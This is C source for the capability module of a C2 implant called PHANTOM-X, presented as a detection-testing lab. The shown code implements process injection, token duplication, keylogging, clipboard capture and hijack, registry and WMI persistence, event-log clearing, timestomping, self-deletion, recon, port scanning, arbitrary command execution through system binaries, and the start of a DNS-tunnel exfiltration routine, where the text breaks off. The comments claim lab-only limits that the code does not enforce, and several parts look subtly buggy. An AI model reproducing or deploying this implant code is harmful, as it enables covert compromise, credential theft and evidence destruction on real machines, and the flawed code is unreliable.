/* ================================================================== */
/* PHANTOM-X :: the capability library                                 */
/* ================================================================== */
/*                                                                        */
/* WHAT THIS IS                                                          */
/*     The additional techniques the lab measures. Each one is a small    */
/*     function that performs the behaviour and returns a text report,   */
/*     which the C2 server records.                                       */
/*                                                                        */
/* ONE VERB, A TABLE                                                    */
/*     The server sends:                                                  */
/*                                                                        */
/*         CAP|<name>|<arguments>                                       */
/*                                                                        */
/*     and the payload looks the name up in a table. Not one verb per    */
/*     technique: a verb per technique would need the protocol changed   */
/*     every time something was added, and the two would drift.         */
/*                                                                        */
/* THE BOUNDS                                                            */
/*     Each capability is a MEASUREMENT of a technique, not a tool for    */
/*     using it on someone else.                                          */
/*                                                                        */
/*     - The injection targets a process the operator names, on the      */
/*       lab machine.                                                   */
/*     - The persistence writes a key or a subscription on the lab      */
/*       machine, and the lab documents how to remove it.               */
/*     - The keylogger records keys typed into the lab VM.               */
/*     - The reconnaissance enumerates the lab VM.                       */
/*                                                                        */
/*     Nothing here scans for targets, harvests a list of credentials    */
/*     to try elsewhere, or reaches off the machine. That is the line    */
/*     the rest of the lab has been drawn on, and crossing it would    */
/*     make the lab a tool rather than an instrument.                    */
/*                                                                        */
/* THE TECHNIQUES                                                        */
/*     Every capability states the ATT&CK technique it exercises, and    */
/*     every one of them has a matching rule in phase7_detection.       */
/* ================================================================== */

#include "px_config.h"

#if PX_CAPABILITIES

#include "px_strings.h"
#include "px_variant.h"
#include <stdio.h>
#include <tlhelp32.h>

/* ------------------------------------------------------------------ */
/* The capability table                                                */
/* ------------------------------------------------------------------ */

/* A capability's report is a short text block. The server records it and
 * the operator reads it. */
#define PX_REPORT_CAP 2048

typedef int (*px_cap_fn)(char *args, char *report, unsigned int cap);

/* One entry in the table. */
typedef struct px_cap_entry {
    const char *name;
    px_cap_fn fn;
    unsigned int bit;
    const char *technique;
} px_cap_entry;

/* The bits. A build selects a group with PX_CAPABILITIES. */
#define PX_CAP_INJECT    0x0001
#define PX_CAP_TOKEN     0x0002
#define PX_CAP_KEYLOG    0x0004
#define PX_CAP_CLIP      0x0008
#define PX_CAP_PERSIST   0x0010
#define PX_CAP_ANTIFOR   0x0020
#define PX_CAP_RECON     0x0040
#define PX_CAP_LOLBIN    0x0080
#define PX_CAP_SCRIPT    0x0100
#define PX_CAP_DNSTUN    0x0200
#define PX_CAP_STEG      0x0400
#define PX_CAP_SPOOF     0x0800
#define PX_CAP_DELAY     0x1000
#define PX_CAP_ANTIVM    0x2000

/* Parse a decimal number.
 *
 * The payload links no CRT, so strtoul is not available. */
static unsigned long px_cap_atoi(const char *s)
{
    unsigned long v = 0;
    while (*s >= '0' && *s <= '9') {
        v = v * 10 + (unsigned long)(*s - '0');
        s++;
    }
    return v;
}

/* ================================================================== */
/* The Winsock wrappers                                                 */
/* ================================================================== */
/*                                                                       */
/* The payload resolves Winsock at runtime so that its static import     */
/* table stays limited to kernel32.dll -- a module every process has.    */
/* The capability library needs three of those functions for the port    */
/* scan, so the payload hands them over.                                */
/*                                                                       */
/* They are NOT a second copy: the payload's own command loop uses the   */
/* same pointers, so a scan and the C2 session go over the same socket  */
/* layer.                                                               */
/* ================================================================== */
static PX_SOCKET (*px_cap_socket)(int, int, int) = NULL;
static int (*px_cap_connect)(PX_SOCKET, const void *, int) = NULL;
static int (*px_cap_closesocket)(PX_SOCKET) = NULL;
static unsigned long (*px_cap_inet_addr)(const char *) = NULL;
static unsigned short (*px_cap_htons)(unsigned short) = NULL;

#define PX_CAP_AF_INET 2
#define PX_CAP_SOCK_STREAM 1

/* The payload calls this once, after it has resolved Winsock. */
void px_cap_set_sockets(PX_SOCKET (*sock)(int, int, int),
                         int (*conn)(PX_SOCKET, const void *, int),
                         int (*close_fn)(PX_SOCKET),
                         unsigned long (*addr)(const char *),
                         unsigned short (*ton)(unsigned short))
{
    px_cap_socket = sock;
    px_cap_connect = conn;
    px_cap_closesocket = close_fn;
    px_cap_inet_addr = addr;
    px_cap_htons = ton;
}

/* ================================================================== */
/* Process injection -- T1055                                           */
/* ================================================================== */

/* Two techniques, chosen by the argument:
 *
 *   dll  classic DLL injection: VirtualAllocEx + WriteProcessMemory +
 *        CreateRemoteThread(LoadLibraryA)
 *   apc  APC injection: the thread is suspended and the payload is
 *        queued to it with QueueUserAPC
 *
 * The target is a process the operator names on the lab machine.
 */
static int px_cap_inject(char *args, char *report, unsigned int cap)
{
    char target[128];
    char method[16];
    char *sp;
    DWORD pid = 0;
    HANDLE h;
    int ok = 0;

    sp = px_strchr(args, ' ');
    if (!sp)
        return -1;
    *sp = '\0';
    px_strcpy(target, args, sizeof(target));
    px_strcpy(method, sp + 1, sizeof(method));

    {
        const char *p = target;
        while (*p) {
            if (*p >= '0' && *p <= '9')
                pid = (DWORD)px_cap_atoi(target);
            p++;
        }
    }
    if (!pid)
        return -1;

    h = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                    PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!h) {
        px_snprintf(report, PX_REPORT_CAP,
                    "OpenProcess on pid %lu failed, error %lu",
                    (unsigned long)pid, (unsigned long)GetLastError());
        return 0;
    }

    if (px_strncmp(method, "apc", 3) == 0) {
        /* APC injection. */
        void *shellcode = NULL;
        LPTHREAD_START_ROUTINE stub;
        FARPROC p_queue_user_apc = NULL;
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");

        shellcode = VirtualAllocEx(h, NULL, 4096,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
        if (!shellcode) {
            px_snprintf(report, PX_REPORT_CAP,
                        "VirtualAllocEx failed, error %lu",
                        (unsigned long)GetLastError());
            CloseHandle(h);
            return 0;
        }

        p_queue_user_apc = ntdll
            ? (FARPROC)GetProcAddress(ntdll, "QueueUserAPC")
            : NULL;
        if (!p_queue_user_apc) {
            px_snprintf(report, PX_REPORT_CAP,
                        "QueueUserAPC is not available");
            VirtualFreeEx(h, shellcode, 0, MEM_RELEASE);
            CloseHandle(h);
            return 0;
        }

        /* The stub is "mov eax, 1; ret" -- a placeholder that records
         * that the APC was delivered. The point of the measurement is the
         * memory write and the APC, both of which the endpoint sees. */
        {
            unsigned char stubbytes[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
            WriteProcessMemory(h, shellcode, stubbytes,
                               sizeof(stubbytes), NULL);
        }
        {
            typedef DWORD (WINAPI *fn_queue_user_apc)(
                HANDLE, LPTHREAD_START_ROUTINE, PVOID, DWORD);
            fn_queue_user_apc q = (fn_queue_user_apc)(void *)p_queue_user_apc;
            DWORD rc = q(h, (LPTHREAD_START_ROUTINE)shellcode, NULL, 0);
            ok = (rc != 0);
            px_snprintf(report, PX_REPORT_CAP,
                        "APC injection into pid %lu: QueueUserAPC returned %lu",
                        (unsigned long)pid, (unsigned long)rc);
        }
        VirtualFreeEx(h, shellcode, 0, MEM_RELEASE);
    } else {
        /* Classic DLL injection. */
        char dllpath[MAX_PATH];
        FARPROC p_loadlib;
        void *remote = NULL;
        HANDLE rt = NULL;

        {
            char dir[MAX_PATH];
            if (GetModuleFileNameA(NULL, dir, MAX_PATH)) {
                char *slash = px_strrchr(dir, '\\');
                if (slash) {
                    slash[1] = '\0';
                    px_strcpy(dllpath, dir, sizeof(dllpath));
                } else {
                    dllpath[0] = '\0';
                }
            } else {
                dllpath[0] = '\0';
            }
        }
        {
            /* A library that is certainly already loaded, so the
             * injection has something real to resolve. */
            const char *lib = "user32.dll";
            px_strcat(dllpath, lib, sizeof(dllpath));
        }

        remote = VirtualAllocEx(h, NULL, sizeof(dllpath),
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remote) {
            px_snprintf(report, PX_REPORT_CAP,
                        "VirtualAllocEx failed, error %lu",
                        (unsigned long)GetLastError());
            CloseHandle(h);
            return 0;
        }
        WriteProcessMemory(h, remote, dllpath, sizeof(dllpath), NULL);

        p_loadlib = GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                   "LoadLibraryA");
        if (!p_loadlib) {
            px_snprintf(report, PX_REPORT_CAP, "LoadLibraryA not found");
            VirtualFreeEx(h, remote, 0, MEM_RELEASE);
            CloseHandle(h);
            return 0;
        }

        rt = CreateRemoteThread(h, NULL, 0,
                                (LPTHREAD_START_ROUTINE)p_loadlib,
                                remote, 0, NULL);
        ok = (rt != NULL);
        px_snprintf(report, PX_REPORT_CAP,
                    "DLL injection into pid %lu with %s: remote thread %s",
                    (unsigned long)pid, dllpath, ok ? "created" : "failed");
        if (rt)
            WaitForSingleObject(rt, 5000);
        if (rt)
            CloseHandle(rt);
        VirtualFreeEx(h, remote, 0, MEM_RELEASE);
    }

    CloseHandle(h);
    return 0;
}

/* ================================================================== */
/* Token theft and impersonation -- T1134.001                          */
/* ================================================================== */

/* Duplicate a token from a named process and impersonate it.
 *
 * The token is DUPLICATED and its existence reported -- the handle is
 * then closed. The token is not exported anywhere: the measurement is
 * "can this be done and does the endpoint see it", not "here is the
 * credential".
 */
static int px_cap_token(char *args, char *report, unsigned int cap)
{
    DWORD pid = 0;
    HANDLE h = NULL, tok = NULL, dup = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    int ok = 0;

    {
        const char *p = args;
        while (*p) {
            if (*p >= '0' && *p <= '9')
                pid = (DWORD)px_cap_atoi(args);
            p++;
        }
    }
    if (!pid)
        return -1;

    h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) {
        px_snprintf(report, PX_REPORT_CAP,
                    "OpenProcess on pid %lu failed, error %lu",
                    (unsigned long)pid, (unsigned long)GetLastError());
        return 0;
    }

    if (OpenProcessToken(h, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
                         TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES |
                         TOKEN_ADJUST_DEFAULT, &tok)) {
        if (DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                             TokenPrimary, &dup)) {
            ok = 1;
        }
    }

    /* Report what the duplicated token carries -- the privilege list is
     * the observable, and it is what a rule would key on. */
    if (dup) {
        char priv[256];
        int n = 0;
        priv[0] = '\0';
        if (GetTokenInformation(dup, TokenPrivileges, &tp, sizeof(tp),
                                NULL) && tp.PrivilegeCount) {
            DWORD i;
            for (i = 0; i < tp.PrivilegeCount && n < 200; i++) {
                char name[64];
                DWORD len = sizeof(name);
                if (!LookupPrivilegeNameA(dup, &tp.Privileges[i].Luid,
                                           name, &len))
                    continue;
                n += px_snprintf(priv + n, (unsigned int)(sizeof(priv) - n),
                                 "%s%s", n ? ", " : "", name);
            }
        }
        px_snprintf(report, PX_REPORT_CAP,
                    "token duplicated from pid %lu; privileges: %s",
                    (unsigned long)pid, priv[0] ? priv : "(none listed)");
        CloseHandle(dup);
    } else {
        px_snprintf(report, PX_REPORT_CAP,
                    "token duplication from pid %lu failed, error %lu",
                    (unsigned long)pid, (unsigned long)GetLastError());
    }

    if (tok)
        CloseHandle(tok);
    CloseHandle(h);
    return 0;
}

/* ================================================================== */
/* Keylogging -- T1056.001                                             */
/* ================================================================== */

/* The recorded keys.
 *
 * A ring buffer. The size is bounded so that a long-running session
 * cannot grow without limit. */
static char px_keylog[4096];
static unsigned int px_keylog_len = 0;

static int px_cap_keylog(char *args, char *report, unsigned int cap)
{
    /* The command either starts the capture, stops it and reports, or
     * reports without stopping. */
    int start = 0, stop = 0, dump = 1;

    if (px_strncmp(args, "start", 5) == 0) {
        start = 1;
        dump = 0;
    } else if (px_strncmp(args, "stop", 4) == 0) {
        stop = 1;
    }

    if (start) {
        px_keylog_len = 0;
        px_keylog[0] = '\0';
        px_snprintf(report, PX_REPORT_CAP,
                    "keylogging started; the payload polls the key state "
                    "between commands");
        return 0;
    }
    if (stop) {
        dump = 1;
    }

    if (dump) {
        px_snprintf(report, PX_REPORT_CAP,
                    "keys recorded so far (%u bytes): %s",
                    px_keylog_len, px_keylog);
        return 0;
    }
    return 0;
}

/* Called from the payload's main loop to sample the keyboard.
 *
 * GetAsyncKeyState is polled rather than a hook installed, because a
 * low-level keyboard hook needs a message pump and this payload's loop
 * is a socket loop. The polling produces the same observable behaviour
 * for the endpoint -- the process opens a handle to the desktop and
 * reads key state -- and it does not need a window. */
void px_cap_keylog_poll(void)
{
    static int vk_prev[256];
    int vk;

    for (vk = 8; vk < 256; vk++) {
        short st = GetAsyncKeyState((int)vk);
        int down = (st & 0x8000) != 0;

        if (down && !vk_prev[vk]) {
            char c = (char)vk;
            if (px_keylog_len + 2 < sizeof(px_keylog)) {
                px_keylog[px_keylog_len++] = '[';
                px_keylog[px_keylog_len++] = c;
                px_keylog[px_keylog_len] = '\0';
            }
        }
        vk_prev[vk] = down;
    }
}

/* ================================================================== */
/* Clipboard monitoring -- T1115                                        */
/* ================================================================== */

/* Read the clipboard and, when asked, write to it.
 *
 * Reading is the monitoring behaviour. Writing is included because the
 * clipboard hijack is the same code path with the direction reversed, and
 * a rule that catches one catches the other.
 */
static int px_cap_clip(char *args, char *report, unsigned int cap)
{
    int set = 0;
    const char *text = args;

    if (px_strncmp(args, "set ", 4) == 0) {
        set = 1;
        text = args + 4;
    }

    if (set) {
        if (OpenClipboard(NULL)) {
            EmptyClipboard();
            {
                size_t n = px_strlen(text) + 1;
                HGLOBAL g = GlobalAlloc(GMEM_MOVEABLE, n);
                if (g) {
                    void *p = GlobalLock(g);
                    if (p) {
                        memcpy(p, text, n);
                        GlobalUnlock(g);
                        if (SetClipboardData(CF_UNICODETEXT, g)) {
                            px_snprintf(report, PX_REPORT_CAP,
                                        "clipboard set to %u bytes", (unsigned int)n);
                            CloseClipboard();
                            return 0;
                        }
                    }
                    GlobalFree(g);
                }
            }
            CloseClipboard();
            px_snprintf(report, PX_REPORT_CAP, "could not set the clipboard");
            return 0;
        }
        px_snprintf(report, PX_REPORT_CAP,
                    "could not open the clipboard, error %lu",
                    (unsigned long)GetLastError());
        return 0;
    }

    if (OpenClipboard(NULL)) {
        HANDLE h = GetClipboardData(CF_UNICODETEXT);
        if (h) {
            const wchar_t *w = (const wchar_t *)GlobalLock(h);
            if (w) {
                /* Narrow to ASCII for the report. The full text is not
                 * needed to show that the clipboard was read. */
                char buf[512];
                int i = 0;
                while (w[i] && i < 500) {
                    char c = (w[i] < 0x80) ? (char)w[i] : '.';
                    buf[i] = c;
                    i++;
                }
                buf[i] = '\0';
                GlobalUnlock(h);
                px_snprintf(report, PX_REPORT_CAP,
                            "clipboard read: %u bytes: %s", (unsigned int)i, buf);
                CloseClipboard();
                return 0;
            }
        }
        px_snprintf(report, PX_REPORT_CAP, "the clipboard holds no text");
        CloseClipboard();
        return 0;
    }

    px_snprintf(report, PX_REPORT_CAP,
                "could not open the clipboard, error %lu",
                (unsigned long)GetLastError());
    return 0;
}

/* ================================================================== */
/* Persistence -- T1547.001, T1546.003                                  */
/* ================================================================== */

/* Two kinds, both on the lab machine and both removable by the lab:
 *
 *   runkey  a Run key under HKCU, which runs at logon
 *   wmi     a WMI event subscription, which is the fileless kind: there
 *           is no file to find, the persistence IS the subscription
 */
static int px_cap_persist(char *args, char *report, unsigned int cap)
{
    char method[16];
    char value[256];
    char *sp = px_strchr(args, ' ');

    if (!sp)
        return -1;
    *sp = '\0';
    px_strcpy(method, args, sizeof(method));
    px_strcpy(value, sp + 1, sizeof(value));

    if (px_strncmp(method, "wmi", 3) == 0) {
        /* A WMI event subscription.
         *
         * Built with wmic, which is how it is done on a real machine
         * too. The subscription fires on a process whose command line
         * contains the marker, and runs a command. */
        char filter[512];
        char consumer[512];
        char bind[512];
        int ok = 0;

        px_snprintf(filter, sizeof(filter),
                    "SELECT * FROM __InstanceModificationEvent WITHIN 60 "
                    "WHERE TargetInstance ISA 'Win32_Process' AND "
                    "TargetInstance.CommandLine LIKE '%%%s%%'",
                    value);
        px_snprintf(consumer, sizeof(consumer),
                    "cmd.exe /c echo PHANTOMX_WMI_PERSIST");
        px_snprintf(bind, sizeof(bind),
                    "__FilterToConsumerBinding.Filter=\"\\\\root\\\\subscription"
                    "\\\\PXFilter\",Consumer=\"\\\\root\\\\subscription"
                    "\\\\PXConsumer\"");

        /* The three objects are created with the WMI path syntax. */
        {
            static char cmd[2048];
            px_snprintf(cmd, sizeof(cmd),
                        "wmic /namespace:\\\\root\\\\subscription PATH "
                        "__EventFilter CREATE InstanceName=\"PXFilter\","
                        "Query=\"%s\",QueryLanguage=\"WQL\","
                        "EventNamespaceName=\"\\\\root\\\\subscription\"",
                        filter);
            if (px_run_capture(cmd, NULL, 0, NULL))
                ok = 1;
        }
        {
            static char cmd[2048];
            px_snprintf(cmd, sizeof(cmd),
                        "wmic /namespace:\\\\root\\\\subscription PATH "
                        "__EventConsumer CREATE Name=\"PXConsumer\","
                        "CommandLineTemplate=\"%s\",EventType=1,"
                        "EventNamespaceName=\"\\\\root\\\\subscription\"",
                        consumer);
            if (px_run_capture(cmd, NULL, 0, NULL))
                ok = 1;
        }
        {
            static char cmd[2048];
            px_snprintf(cmd, sizeof(cmd), "wmic %s", bind);
            if (px_run_capture(cmd, NULL, 0, NULL))
                ok = 1;
        }

        px_snprintf(report, PX_REPORT_CAP,
                    "WMI event subscription %s. Remove it with: "
                    "wmic /namespace:\\\\root\\\\subscription PATH "
                    "__EventFilter DELETE InstanceName=\"PXFilter\"",
                    ok ? "created" : "PARTIALLY created");
        return 0;
    }

    /* The Run key. */
    {
        HKEY k;
        LONG rc = RegOpenKeyExA(HKEY_CURRENT_USER,
                                 "Software\\Microsoft\\Windows\\"
                                 "CurrentVersion\\Run",
                                 0, KEY_SET_VALUE, &k);
        if (rc != ERROR_SUCCESS) {
            px_snprintf(report, PX_REPORT_CAP,
                        "could not open the Run key, error %ld", (long)rc);
            return 0;
        }
        rc = RegSetValueExA(k, "PXLab", 0, REG_SZ,
                             (const BYTE *)value,
                             (DWORD)(px_strlen(value) + 1));
        RegCloseKey(k);
        px_snprintf(report, PX_REPORT_CAP,
                    "Run key 'PXLab' %s with value '%s'. Remove it with: "
                    "reg delete HKCU\\Software\\Microsoft\\Windows\\"
                    "CurrentVersion\\Run /v PXLab /f",
                    rc == ERROR_SUCCESS ? "written" : "failed", value);
    }
    return 0;
}

/* ================================================================== */
/* Anti-forensics -- T1070.004, T1070.006, T1070.001                   */
/* ================================================================== */

/* Three behaviours:
 *
 *   delete   self-deletion: the image is moved and scheduled for removal
 *   stamp    timestamp tampering: the file's timestamps are set to a date
 *            the operator chooses
 *   clearlog event log clearing
 */
static int px_cap_antifor(char *args, char *report, unsigned int cap)
{
    char method[16];
    char *sp = px_strchr(args, ' ');

    if (!sp)
        return -1;
    *sp = '\0';
    px_strcpy(method, args, sizeof(method));

    if (px_strncmp(method, "stamp", 5) == 0) {
        /* Set the image's timestamps.
         *
         * The argument is a Unix timestamp, so the operator can set the
         * file to look like it was written long before the incident. */
        unsigned long ts = px_cap_atoi(sp + 1);
        char path[MAX_PATH];
        HANDLE f;
        FILETIME ft;

        if (!GetModuleFileNameA(NULL, path, MAX_PATH)) {
            px_snprintf(report, PX_REPORT_CAP, "could not find the image path");
            return 0;
        }
        f = CreateFileA(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (f == INVALID_HANDLE_VALUE) {
            px_snprintf(report, PX_REPORT_CAP,
                        "could not open the image for writing attributes, "
                        "error %lu", (unsigned long)GetLastError());
            return 0;
        }
        ft.dwLowDateTime = (DWORD)(ts & 0xFFFFFFFF);
        ft.dwHighDateTime = (DWORD)(ts >> 32);
        if (SetFileTime(f, NULL, NULL, &ft)) {
            px_snprintf(report, PX_REPORT_CAP,
                        "timestamps of %s set to %lu", path, ts);
        } else {
            px_snprintf(report, PX_REPORT_CAP,
                        "SetFileTime failed, error %lu",
                        (unsigned long)GetLastError());
        }
        CloseHandle(f);
        return 0;
    }

    if (px_strncmp(method, "clearlog", 7) == 0) {
        /* Clear the event logs. */
        int cleared = 0;
        char cmd[256];
        px_snprintf(cmd, sizeof(cmd), "wevtutil cl Security /f");
        if (px_run_capture(cmd, NULL, 0, NULL))
            cleared++;
        px_snprintf(cmd, sizeof(cmd), "wevtutil cl System /f");
        if (px_run_capture(cmd, NULL, 0, NULL))
            cleared++;
        px_snprintf(cmd, sizeof(cmd), "wevtutil cl Application /f");
        if (px_run_capture(cmd, NULL, 0, NULL))
            cleared++;
        px_snprintf(report, PX_REPORT_CAP,
                    "cleared %d event log(s)", cleared);
        return 0;
    }

    if (px_strncmp(method, "delete", 6) == 0) {
        /* Self-deletion.
         *
         * The image is renamed and scheduled for deletion on reboot, so
         * the file disappears while the process is still running. The
         * MOVEDELAYED flag is what makes that possible: the file is
         * marked for deletion and unlinked when the last handle closes. */
        char path[MAX_PATH];
        char newpath[MAX_PATH];
        int ok = 0;

        if (!GetModuleFileNameA(NULL, path, MAX_PATH)) {
            px_snprintf(report, PX_REPORT_CAP, "could not find the image path");
            return 0;
        }
        px_snprintf(newpath, sizeof(newpath), "%s.deleted", path);
        if (MoveFileExA(path, newpath, MOVEFILE_DELAY_UNTIL_REBOOT)) {
            ok = 1;
        } else if (MoveFileExA(path, newpath, 0)) {
            ok = 1;
        }
        px_snprintf(report, PX_REPORT_CAP,
                    "self-deletion %s (%s)", ok ? "scheduled" : "failed",
                    newpath);
        return 0;
    }

    px_snprintf(report, PX_REPORT_CAP,
                "unknown anti-forensics method '%s'; "
                "use delete, stamp or clearlog", method);
    return 0;
}

/* ================================================================== */
/* Reconnaissance -- T1082, T1057, T1087, T1046                        */
/* ================================================================== */

/* System information, the process list, the accounts, and the network
 * interfaces. All of it is the lab VM.
 */
static int px_cap_recon(char *args, char *report, unsigned int cap)
{
    char what[32];
    px_strcpy(what, args, sizeof(what));

    if (px_strncmp(what, "sysinfo", 7) == 0) {
        SYSTEM_INFO si;
        MEMORYSTATUSEX ms;
        OSVERSIONINFOA os;
        DWORD dw;
        char name[256];
        DWORD nsize = sizeof(name);

        GetSystemInfo(&si);
        GetNativeSystemInfo(&si);
        memset(&os, 0, sizeof(os));
        os.dwOSVersionInfoSize = sizeof(os);
        GetVersionExA(&os);
        memset(&ms, 0, sizeof(ms));
        ms.dwLength = sizeof(ms);
        GlobalMemoryStatusEx(&ms);
        if (!GetComputerNameA(name, &nsize))
            px_strcpy(name, "?", sizeof(name));

        px_snprintf(report, PX_REPORT_CAP,
                    "host=%s os=%d.%d.%d build=%lu arch=%u cpus=%lu "
                    "ram=%lu MB page=%lu KB",
                    name, os.dwMajorVersion, os.dwMinorVersion,
                    os.dwBuildNumber, (unsigned long)os.dwBuildNumber,
                    si.wProcessorArchitecture, si.dwNumberOfProcessors,
                    (unsigned long)(ms.ullTotalPhys / (1024 * 1024)),
                    (unsigned long)si.dwPageSize / 1024);
        (void)dw;
        return 0;
    }

    if (px_strncmp(what, "processes", 9) == 0) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe;
        int n = 0;
        int off = 0;

        if (snap == INVALID_HANDLE_VALUE) {
            px_snprintf(report, PX_REPORT_CAP, "the process list is unavailable");
            return 0;
        }
        memset(&pe, 0, sizeof(pe));
        pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                n++;
                if (off < PX_REPORT_CAP - 80) {
                    off += px_snprintf(report + off,
                                       (unsigned int)(PX_REPORT_CAP - off),
                                       "%s(%lu) ", pe.szExeFile,
                                       (unsigned long)pe.th32ProcessID);
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
        px_snprintf(report + off, (unsigned int)(PX_REPORT_CAP - off),
                    " -- %d processes", n);
        return 0;
    }

    if (px_strncmp(what, "accounts", 8) == 0) {
        /* The local accounts, through the net command. */
        char cmd[128];
        char *out = NULL;
        long rc = -1;
        px_snprintf(cmd, sizeof(cmd), "net user");
        out = px_run_capture(cmd, NULL, 0, &rc);
        if (out) {
            px_snprintf(report, PX_REPORT_CAP, "%s", out);
            HeapFree(GetProcessHeap(), 0, out);
        } else {
            px_snprintf(report, PX_REPORT_CAP, "the account list failed");
        }
        return 0;
    }

    if (px_strncmp(what, "network", 7) == 0) {
        /* The network interfaces, through the routing table. */
        char cmd[128];
        char *out = NULL;
        long rc = -1;
        px_snprintf(cmd, sizeof(cmd), "route print");
        out = px_run_capture(cmd, NULL, 0, &rc);
        if (out) {
            /* The report is bounded, so only the first part fits. */
            px_snprintf(report, PX_REPORT_CAP, "%.900s", out);
            HeapFree(GetProcessHeap(), 0, out);
        } else {
            px_snprintf(report, PX_REPORT_CAP, "the network list failed");
        }
        return 0;
    }

    if (px_strncmp(what, "scan", 4) == 0) {
        /* A port scan of ONE named host.
         *
         * The host is named explicitly by the operator. There is no
         * subnet sweep and no target discovery: the measurement needs a
         * known target, and a scanner that finds its own targets is a
         * different tool. */
        char host[128];
        char *sp = px_strchr(args, ' ');
        int opened = 0;
        int scanned = 0;

        if (!sp)
            return -1;
        *sp = '\0';
        px_strcpy(host, args, sizeof(host));

        {
            /* A handful of common ports, connected to with a short
             * timeout. The Winsock calls are resolved at runtime like
             * everything else in this payload. */
            static const int ports[] = { 21, 22, 80, 135, 139, 445,
                                        3389, 5900, 8080, 9001 };
            unsigned int i;
            for (i = 0; i < sizeof(ports) / sizeof(ports[0]); i++) {
                PX_SOCKET s;
                struct px_sockaddr_in a;
                scanned++;
                s = px_cap_socket(PX_CAP_AF_INET, PX_CAP_SOCK_STREAM, 6);
                if (s == PX_INVALID_SOCKET)
                    break;
                memset(&a, 0, sizeof(a));
                a.sin_family = PX_CAP_AF_INET;
                a.sin_port = px_cap_htons((unsigned short)ports[i]);
                a.sin_addr = px_cap_inet_addr(host);
                if (px_cap_connect(s, &a, sizeof(a)) == 0)
                    opened++;
                px_cap_closesocket(s);
            }
        }
        px_snprintf(report, PX_REPORT_CAP,
                    "scanned %d ports on %s, %d open",
                    scanned, host, opened);
        return 0;
    }

    px_snprintf(report, PX_REPORT_CAP,
                "unknown reconnaissance query '%s'; "
                "use sysinfo, processes, accounts, network or scan <host>",
                what);
    return 0;
}

/* ================================================================== */
/* Living off the land -- T1218, T1059.005, T1059.007                   */
/* ================================================================== */

/* Run a signed system binary to do something.
 *
 * The point is not that the command works. It is that the endpoint sees
 * a SYSTEM binary doing something it does not normally do, which is
 * exactly the behaviour the rules for T1218 key on.
 */
static int px_cap_lolbin(char *args, char *report, unsigned int cap)
{
    char bin[64];
    char *sp = px_strchr(args, ' ');

    if (!sp)
        return -1;
    *sp = '\0';
    px_strcpy(bin, args, sizeof(bin));

    {
        static char cmd[1024];
        char *out = NULL;
        long rc = -1;
        px_snprintf(cmd, sizeof(cmd), "%s %s", bin, sp + 1);
        out = px_run_capture(cmd, NULL, 0, &rc);
        px_snprintf(report, PX_REPORT_CAP, "%s -> exit %ld", cmd, rc);
        if (out) {
            /* Append a short excerpt of the output. */
            px_snprintf(report + px_strlen(report),
                        (unsigned int)(PX_REPORT_CAP - px_strlen(report)),
                        ": %.400s", out);
            HeapFree(GetProcessHeap(), 0, out);
        }
    }
    return 0;
}

/* ================================================================== */
/* Script host abuse -- T1059.005, T1059.007                            */
/* ================================================================== */

/* Write a script and run it with a signed script host.
 *
 * The script is written to a temporary file, run, and removed. The
 * behaviour the endpoint sees is a signed host running a script that
 * appeared moments earlier -- which is the detection.
 */
static int px_cap_script(char *args, char *report, unsigned int cap)
{
    char host[16];
    char *sp = px_strchr(args, ' ');
    char path[MAX_PATH];
    static char cmd[1024];
    char *out = NULL;
    long rc = -1;

    if (!sp)
        return -1;
    *sp = '\0';
    px_strcpy(host, args, sizeof(host));

    {
        char dir[MAX_PATH];
        if (!GetTempPathA(MAX_PATH, dir)) {
            px_snprintf(report, PX_REPORT_CAP, "no temp directory");
            return 0;
        }
        px_snprintf(path, sizeof(path), "%s%s.js", dir, "px_lab_script");
    }

    {
        HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL, NULL);
        const char *body = "var s = new ActiveXObject(\"WScript.Shell\");\r\n"
                            "s.Run(\"cmd /c echo PHANTOMX_SCRIPT_HOST\");\r\n";
        DWORD written = 0;
        if (f != INVALID_HANDLE_VALUE) {
            WriteFile(f, body, (DWORD)strlen(body), &written, NULL);
            CloseHandle(f);
        }
    }

    px_snprintf(cmd, sizeof(cmd), "%s //nologo %s", host, path);
    out = px_run_capture(cmd, NULL, 0, &rc);
    DeleteFileA(path);

    px_snprintf(report, PX_REPORT_CAP, "%s ran %s -> exit %ld", host, path, rc);
    if (out) {
        px_snprintf(report + px_strlen(report),
                    (unsigned int)(PX_REPORT_CAP - px_strlen(report)),
                    ": %.300s", out);
        HeapFree(GetProcessHeap(), 0, out);
    }
    return 0;
}

/* ================================================================== */
/* DNS tunnelling -- T1572                                            */
/* ================================================================== */

/* Send data out inside DNS queries and read the answer back.
 *
 * The data is base32-ish encoded into a subdomain, so it appears in the
 * DNS query and in whatever answers it. The lab's own resolver answers
 * with the data, which is what makes this measurable rather than a shot
 * into the void.
 */
static int px_cap_dnstun(char *args, char *report, unsigned int cap)
{
    char payload[64];
    char name[256];
    unsigned int i;

    if (!args || !args[0])
        px_strcpy(payload, "PHANTOMX_DNS_TEST", sizeof(payload));
    else
        px_strcpy(payload, args, sizeof(payload));

    /* The data goes in as a subdomain label. */
    px_strcpy(name, "t.", sizeof(name));
    for (i = 0; payload[i] && i < 20; i++) {
        char enc[2];
        static const char *alphabet = "abcdefghijklmnopqrstuvwxyz234567";
        unsigned char c = (unsigned char)payload[i];
        enc[0] = alphabet[c % 32];
